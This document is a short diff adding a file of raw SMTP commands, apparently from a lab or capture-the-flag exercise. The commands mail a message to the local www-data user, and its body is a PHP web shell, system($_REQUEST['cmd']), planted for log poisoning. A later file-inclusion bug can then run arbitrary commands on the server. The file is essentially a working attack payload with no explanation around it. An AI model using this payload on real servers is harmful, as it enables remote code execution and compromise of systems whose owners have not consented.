@@ -1,0 +1,10 @@
+EHLO test.com
+
+VRFY www-data@localhost
+mail from: test.com
+rcpt to: www-data@localhost
+data
+Subject: This is exploit
+<?php echo system($_REQUEST['cmd']); ?>
+.
+quit
